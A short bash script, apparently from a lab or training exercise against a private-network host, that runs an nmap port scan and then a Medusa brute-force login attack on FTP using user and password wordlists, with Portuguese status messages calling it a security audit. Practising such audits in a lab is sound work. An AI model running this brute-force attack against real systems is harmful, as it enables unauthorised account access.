#!/bin/bash
# scripts/run_audit.sh

TARGET="192.168.56.101"
USER_FILE="../wordlists/users.txt"
PASS_FILE="../wordlists/passwords_short.txt"

echo "--------------------------------------------------"
echo "Iniciando Auditoria de Segurança: $TARGET"
echo "--------------------------------------------------"

echo "[1] Varrendo portas abertas (Nmap)..."
nmap -F $TARGET > scan_result.txt

echo "[2] Iniciando teste de força bruta no FTP com Medusa..."
medusa -h $TARGET -U $USER_FILE -P $PASS_FILE -M ftp -O medusa_ftp_results.txt

echo "--------------------------------------------------"
echo "Auditoria Finalizada. Verifique os arquivos de log."
echo "--------------------------------------------------"